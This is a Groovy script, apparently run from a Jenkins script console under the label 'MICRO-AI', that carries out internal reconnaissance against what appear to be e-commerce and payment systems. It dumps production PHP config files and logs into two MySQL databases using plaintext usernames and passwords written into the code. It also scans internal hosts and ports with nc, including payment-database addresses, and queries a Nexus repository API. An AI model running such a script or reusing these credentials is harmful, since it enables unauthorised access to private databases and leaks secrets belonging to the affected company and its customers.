// MICRO-AI: Read caja-ng PROD config + test DB connectivity + T1 deep search
def run = { cmd ->
    def p = ["bash", "-c", cmd].execute()
    def out = new StringBuffer()
    def err = new StringBuffer()
    p.consumeProcessOutput(out, err)
    p.waitForOrKill(25000)
    out.toString().take(5000)
}

println "=== caja-ng/config/production.php ==="
def prod = run("cat '/var/jenkins_home/workspace/cs_msa_build_caja-ng/config/production.php' 2>/dev/null")
println prod.take(3000)

println "\n=== caja-ng/config/global.php ==="
def glob = run("cat '/var/jenkins_home/workspace/cs_msa_build_caja-ng/config/global.php' 2>/dev/null")
println glob.take(2000)

println "\n=== caja-ng/config/autoload/global.php ==="
def aglobal = run("cat '/var/jenkins_home/workspace/cs_msa_build_caja-ng/config/autoload/global.php' 2>/dev/null")
println aglobal.take(2000)

println "\n=== TEST DB CONNECTIVITY from Jenkins container ==="
// Test if we can reach the tienda DB
def mysqlTest = run("mysql -h appdb.claroshop-services.net -u adaxxidb -pJTQ6PrkecY3y1kVN tienda -e 'SHOW TABLES LIMIT 10;' 2>&1 | head -20")
println "Tienda DB test: " + mysqlTest.take(1000)

def mysqlTest2 = run("mysql -h dbps.claroshop-services.net -P 3310 -u dbsanbornsapi -p'4568F4F_g0mz#aB4NxhEnO18' tienda -e 'SHOW TABLES LIMIT 10;' 2>&1 | head -20")
println "Sanborns DB test: " + mysqlTest2.take(1000)

// Try nc to check if DB ports are reachable
def ncTest = run("nc -zv -w5 appdb.claroshop-services.net 3306 2>&1")
println "nc appdb:3306 = " + ncTest.take(200)

def ncTest2 = run("nc -zv -w5 dbps.claroshop-services.net 3310 2>&1")
println "nc dbps:3310 = " + ncTest2.take(200)

println "\n=== TEST 172.27.141.4 T1Pagos DB port ==="
def t1nc = run("nc -zv -w5 172.27.141.4 3310 2>&1 && echo OPEN || echo CLOSED")
println "172.27.141.4:3310 = " + t1nc.take(200)

def t1nc2 = run("nc -zv -w5 172.27.141.24 3308 2>&1 && echo OPEN || echo CLOSED")
println "172.27.141.24:3308 = " + t1nc2.take(200)

// Also check Nexus
def nexusTest = run("curl -sk 'http://172.27.141.25:8081/service/rest/v1/repositories' 2>&1 | head -30")
println "Nexus repositories: " + nexusTest.take(500)

println "=== DONE MICRO-AI ==="
